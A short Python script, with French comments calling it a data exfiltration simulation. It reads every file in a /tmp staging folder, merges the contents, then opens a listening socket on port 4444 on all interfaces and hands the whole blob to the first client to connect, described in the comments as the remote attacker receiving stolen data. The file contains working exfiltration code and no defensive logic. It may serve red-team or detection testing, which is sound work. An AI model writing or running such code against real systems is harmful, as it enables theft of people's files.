"""
Script de simulation d'exfiltration de données.
Lit tous les fichiers du dossier /tmp/donnees_exfiltration, 
les assemble en un seul bloc de données, puis ouvre un serveur socket 
sur le port 4444 pour envoyer les données volées à un attaquant distant.
"""
import os
import socket
import time

dossier="/tmp/donnees_exfiltration"

fichiers_a_voler=[]
with os.scandir(dossier) as fichiers:
    for f in fichiers:
        if f.is_file():
            fichiers_a_voler.append(f.path)
            
donnees=b""
for f in fichiers_a_voler:
    with open(f,"rb") as g:
        donnees+=g.read()
        

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("0.0.0.0",4444))
s.listen(1)
s.settimeout(60)
print("Serveur prêt sur port 4444")
s_voleur,ip_voleur=s.accept()
time.sleep(3)
s_voleur.send(donnees)
s.close()
